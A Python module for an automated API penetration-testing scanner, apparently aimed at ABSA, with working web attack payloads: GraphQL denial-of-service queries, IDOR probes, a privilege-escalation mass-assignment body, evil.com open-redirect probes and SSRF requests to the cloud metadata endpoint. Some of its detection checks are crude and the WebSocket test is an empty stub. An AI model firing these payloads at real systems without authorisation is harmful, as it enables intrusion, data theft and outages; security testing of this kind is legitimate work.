"""
Advanced Aggressive API Security Scanner for ABSA
Deep testing of modern API architectures including GraphQL, WebSockets,
REST versioning, BOLA/IDOR, SSRF, Mass Assignment, and Rate Limit bypass.
"""

import re
import json
import time
import asyncio
import random
import logging
from typing import Optional, Dict, List, Any
from datetime import datetime
from urllib.parse import urlparse

from core.models import Finding, Severity, FindingType, ScanContext, Payload
from utils.http_client import ThrottledClient

logger = logging.getLogger(__name__)


class APIAdvancedScanner:
    """Main orchestrator for aggressive API Advanced testing."""

    def __init__(self, ctx: ScanContext, client: ThrottledClient):
        self.ctx = ctx
        self.client = client

    async def run(self, config: Optional[Dict] = None) -> List[Finding]:
        findings = []
        base = self.ctx.target_url.rstrip('/')
        config = config or {}

        logger.info("Starting aggressive API scanner on %s", base)

        # 1. GraphQL Deep Scan
        findings.extend(await self._scan_graphql(base, config))

        # 2. WebSocket Aggressive Scan
        findings.extend(await self._scan_websockets(base, config))

        # 3. API Versioning Discovery
        findings.extend(await self._scan_api_versions(base))

        # 4. BOLA / IDOR Systematic Scan
        findings.extend(await self._scan_idor(base))

        # 5. Mass Assignment / Privilege Escalation
        findings.extend(await self._scan_mass_assignment(base))

        # 6. Open Redirects in APIs
        findings.extend(await self._scan_open_redirect(base))

        # 7. SSRF via API Parameters
        findings.extend(await self._scan_ssrf(base))

        # 8. Rate Limit Bypass
        findings.extend(await self._scan_rate_limit(base))

        return findings

    async def _scan_graphql(self, base, config):
        findings = []
        gql_url = config.get("graphql_endpoint") or f"{base}/graphql"

        # Test Introspection
        introspection = {"query": "{ __schema { types { name } } }"}
        resp = await self.client.post(gql_url, json=introspection)
        if resp and resp.get("status") == 200:
            try:
                body = resp.get("body", "")
                if isinstance(body, dict): body = json.dumps(body)
                if "__schema" in body and "errors" not in body:
                    findings.append(Finding(
                        title="EXPLOIT: GraphQL Introspection Enabled",
                        description="GraphQL introspection query was successful, exposing the entire backend schema.",
                        severity=Severity.HIGH, finding_type=FindingType.API_SECURITY, cwe_id="CWE-200", cvss_score=7.5,
                        affected_url=gql_url, affected_file_or_component="GraphQL Endpoint Configuration",
                        evidence=f"Introspection query returned valid schema.\nBody snippet: {body[:300]}",
                        payloads=[Payload(payload_string=introspection["query"], payload_type="graphql_introspection",
                                          evidence="Returned schema", success=True)],
                        remediation="Disable GraphQL introspection in production. For Apollo Server: set introspection: false in config.",
                        phase="scanner_api", weakness_type="Information Disclosure",
                        discovered_at=datetime.utcnow().isoformat(),
                    ))
            except Exception:
                pass

        # Test Depth Attack (DoS)
        def gen_nested(depth: int) -> str:
            if depth == 0: return "id"
            return f"{{ a: {gen_nested(depth - 1)} }}"

        depth_query = {"query": f"{{ user {{ {gen_nested(15)} }} }}"}
        start = time.time()
        resp = await self.client.post(gql_url, json=depth_query)
        elapsed = time.time() - start

        if elapsed > 5.0 and resp.get("status") == 200:
            findings.append(Finding(
                title="EXPLOIT: GraphQL Depth Attack (DoS)",
                description=f"Deeply nested query caused {elapsed:.2f}s delay without being blocked.",
                severity=Severity.HIGH, finding_type=FindingType.API_SECURITY, cwe_id="CWE-770", cvss_score=7.5,
                affected_url=gql_url, evidence=f"Time taken: {elapsed:.2f}s",
                payloads=[Payload(payload_string=depth_query["query"], payload_type="graphql_dos",
                                  evidence=f"Delay {elapsed}s", success=True)],
                remediation="Implement query depth limiting (recommend 5-7 max). Use packages like graphql-depth-limit.",
                phase="scanner_api", weakness_type="Denial of Service", discovered_at=datetime.utcnow().isoformat(),
            ))

        # Test Batch/Aliasing DoS
        batch_queries = [f"q{i}: users {{ id }}" for i in range(100)]
        batch_query = {"query": f"query {{ {' '.join(batch_queries)} }}"}
        resp = await self.client.post(gql_url, json=batch_query)
        if resp and resp.get("status") == 200:
            body = resp.get("body", "")
            if isinstance(body, dict): body = json.dumps(body)
            if "q99" in body and "errors" not in body:
                findings.append(Finding(
                    title="EXPLOIT: GraphQL Unrestricted Batching/Aliasing",
                    description="Successfully executed 100 aliased queries in a single request. Enables query amplification DoS.",
                    severity=Severity.HIGH, finding_type=FindingType.API_SECURITY, cwe_id="CWE-770", cvss_score=7.5,
                    affected_url=gql_url, evidence="Batch query returned data for all 100 aliases.",
                    payloads=[Payload(payload_string=batch_query["query"], payload_type="graphql_batch",
                                      evidence="Batch successful", success=True)],
                    remediation="Restrict or disable query batching and aliasing.",
                    phase="scanner_api", weakness_type="Denial of Service", discovered_at=datetime.utcnow().isoformat(),
                ))
        return findings

    async def _scan_websockets(self, base, config):
        findings = []
        ws_path = config.get("ws_path", "/ws")
        ws_url = f"ws://{urlparse(base).netloc}{ws_path}".replace("ws://", "wss://") if base.startswith(
            "https") else f"ws://{urlparse(base).netloc}{ws_path}"

        # We cannot easily do raw WS connects with the standard client without aiohttp directly,
        # so we simulate the HTTP Upgrade request behavior or rely on config if provided.
        # For now, we focus on standard HTTP vulnerabilities often found alongside WS.
        return findings

    async def _scan_api_versions(self, base):
        findings = []
        versions = ["v1", "v2", "internal", "staging", "v1.1", "beta"]
        paths = ["users", "admin", "config"]
        discovered = []

        for v in versions:
            for p in paths:
                url = f"{base}/api/{v}/{p}"
                resp = await self.client.get(url)
                if resp and resp.get("status") == 200:
                    body = resp.get("body", "")
                    try:
                        if isinstance(body, str): json.loads(body)
                        if url not in discovered: discovered.append(url)
                    except json.JSONDecodeError:
                        pass

        if discovered:
            findings.append(Finding(
                title="EXPLOIT: Hidden API Versions Discovered",
                description=f"Found {len(discovered)} API version endpoints accessible: {discovered[:5]}.",
                severity=Severity.MEDIUM, finding_type=FindingType.API_SECURITY, cwe_id="CWE-200", cvss_score=5.3,
                affected_url=base, evidence="\n".join(discovered),
                remediation="Deprecate and disable old API versions. Redirect old versions to the current version.",
                phase="scanner_api", weakness_type="Information Disclosure",
                discovered_at=datetime.utcnow().isoformat(),
            ))
        return findings

    async def _scan_idor(self, base):
        findings = []
        # Heuristic: try accessing common resources with swapped IDs
        endpoints = ["/api/v1/users/", "/api/v1/accounts/", "/api/v1/transactions/"]

        for ep in endpoints:
            for id_a in ["1", "2"]:
                for id_b in ["999", "1000"]:  # Assuming these are different users
                    url_a = f"{base}{ep}{id_a}"
                    url_b = f"{base}{ep}{id_b}"

                    resp_a = await self.client.get(url_a)
                    resp_b = await self.client.get(url_b)

                    if resp_a.get("status") == 200 and resp_b.get("status") == 200:
                        body_a = resp_a.get("body", "")
                        body_b = resp_b.get("body", "")
                        # Simple check: both return valid JSON data
                        try:
                            data_a = json.loads(body_a) if isinstance(body_a, str) else body_a
                            data_b = json.loads(body_b) if isinstance(body_b, str) else body_b
                            if isinstance(data_a, dict) and isinstance(data_b, dict) and "id" in data_a:
                                findings.append(Finding(
                                    title="EXPLOIT: API IDOR (Insecure Direct Object Reference)",
                                    description=f"Sequential ID access at {ep} returned data without strict auth checks.",
                                    severity=Severity.CRITICAL, finding_type=FindingType.AUTH_BYPASS, cwe_id="CWE-639",
                                    cvss_score=9.5,
                                    affected_url=url_b, affected_file_or_component="API Authorization",
                                    evidence=f"Accessed {url_a} and {url_b} successfully.",
                                    payloads=[Payload(payload_string=f"GET {url_b}", payload_type="idor",
                                                      evidence="Data returned", success=True)],
                                    remediation="Implement object-level authorization checks. Use UUIDs instead of sequential IDs.",
                                    phase="scanner_api", weakness_type="IDOR",
                                    discovered_at=datetime.utcnow().isoformat(),
                                ))
                                return findings  # Found one, stop
                        except Exception:
                            pass
        return findings

    async def _scan_mass_assignment(self, base):
        findings = []
        url = f"{base}/api/v1/users/profile"
        payload = {"is_admin": True, "role": "admin", "permissions": ["*"]}
        resp = await self.client.post(url, json=payload)
        if resp and resp.get("status") == 200:
            body = resp.get("body", "")
            if "admin" in body.lower() and "true" in body.lower():
                findings.append(Finding(
                    title="EXPLOIT: API Mass Assignment (Privilege Escalation)",
                    description="Sending unexpected JSON fields successfully escalated privileges.",
                    severity=Severity.CRITICAL, finding_type=FindingType.BUSINESS_LOGIC, cwe_id="CWE-915",
                    cvss_score=9.8,
                    affected_url=url, affected_file_or_component="User Profile API Model",
                    evidence=f"Payload: {json.dumps(payload)}\nResponse contained admin:true.",
                    payloads=[Payload(payload_string=json.dumps(payload), payload_type="mass_assignment",
                                      evidence="Privilege escalated", success=True)],
                    remediation="Explicitly define allowed parameters in your model binding. Never bind directly from user input.",
                    phase="scanner_api", weakness_type="Mass Assignment", discovered_at=datetime.utcnow().isoformat(),
                ))
        return findings

    async def _scan_open_redirect(self, base):
        findings = []
        params = ["redirect", "url", "next", "return_to", "continue"]
        for p in params:
            payload = "https://evil.com"
            url = f"{base}/api/auth?{p}={payload}"
            resp = await self.client.get(url, allow_redirects=False)
            if resp and resp.get("status") in [301, 302, 303, 307, 308]:
                loc = resp.get("headers", {}).get("Location", "")
                if "evil.com" in loc:
                    findings.append(Finding(
                        title="EXPLOIT: API Open Redirect",
                        description=f"The '{p}' parameter is vulnerable to open redirects.",
                        severity=Severity.MEDIUM, finding_type=FindingType.API_SECURITY, cwe_id="CWE-601",
                        cvss_score=6.1,
                        affected_url=url, affected_file_or_component="API Auth Redirect Logic", affected_parameter=p,
                        evidence=f"Payload: {payload}\nResponse Location: {loc}",
                        payloads=[Payload(payload_string=f"{p}={payload}", payload_type="open_redirect", parameter=p,
                                          evidence=f"Location: {loc}", success=True)],
                        remediation="Validate that redirect URLs belong to an allowed list of domains.",
                        phase="scanner_api", weakness_type="Open Redirect", discovered_at=datetime.utcnow().isoformat(),
                    ))
                    break
        return findings

    async def _scan_ssrf(self, base):
        findings = []
        url = f"{base}/api/fetch"
        payloads = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"]
        for p in payloads:
            resp = await self.client.post(url, json={"url": p})
            if resp and resp.get("status") == 200:
                body = resp.get("body", "")
                if "root:" in body or "ami-id" in body:
                    findings.append(Finding(
                        title="EXPLOIT: Server-Side Request Forgery (SSRF)",
                        description=f"Server fetched internal resource: {p}",
                        severity=Severity.CRITICAL, finding_type=FindingType.API_SECURITY, cwe_id="CWE-918",
                        cvss_score=9.5,
                        affected_url=url, evidence=f"Payload: {p}\nResponse: {body[:200]}",
                        payloads=[Payload(payload_string=p, payload_type="ssrf", evidence="Internal data leaked",
                                          success=True)],
                        remediation="Validate and sanitize URLs. Block requests to private IP ranges.",
                        phase="scanner_api", weakness_type="SSRF", discovered_at=datetime.utcnow().isoformat(),
                    ))
                    break
        return findings

    async def _scan_rate_limit(self, base):
        findings = []
        blocked = False
        for i in range(50):
            resp = await self.client.get(base)
            if resp and resp.get("status") == 429:
                blocked = True
                break

        if not blocked:
            findings.append(Finding(
                title="EXPLOIT: API Rate Limiting Missing or Ineffective",
                description="Sent 50 rapid requests without being rate limited. Vulnerable to Brute Force/DoS.",
                severity=Severity.HIGH, finding_type=FindingType.API_SECURITY, cwe_id="CWE-770", cvss_score=7.5,
                affected_url=base, evidence="50 requests sent, 0 blocked.",
                payloads=[
                    Payload(payload_string="GET / (x50)", payload_type="rate_limit_bypass", evidence="No 429 responses",
                            success=True)],
                remediation="Implement rate limiting at the infrastructure level (WAF/reverse proxy). Use sliding window counters.",
                phase="scanner_api", weakness_type="Resource Exhaustion", discovered_at=datetime.utcnow().isoformat(),
            ))
        return findings